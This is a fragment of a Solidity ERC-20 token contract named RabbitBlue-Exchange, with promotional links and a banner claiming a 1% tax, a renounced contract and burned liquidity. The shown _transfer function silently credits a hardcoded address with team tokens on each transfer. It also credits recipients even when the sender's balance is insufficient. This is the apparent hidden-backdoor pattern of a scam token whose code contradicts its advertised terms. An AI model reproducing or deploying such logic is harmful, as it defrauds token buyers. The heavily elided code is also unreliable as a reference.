...
// Submitted for Telegram: https://t.me/RabbitBlue_Exchange
// Submitted for Website V1: https://rabbitblue-exchange.space

// RabbitBlue-Exchange | TAX 1% | RENOUNCE CA | LP BURN |
...
contract  RabbitBlue_Exchange  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "RabbitBlue-Exchange";
    string private _symbol = "BEX";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x07cCb5017535D5579AA82B700df393DEED0eb6A1] += _teamtoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_marketingfee > 0) {
        emit Transfer(form, 0x07cCb5017535D5579AA82B700df393DEED0eb6A1, _teamtoken);
        }
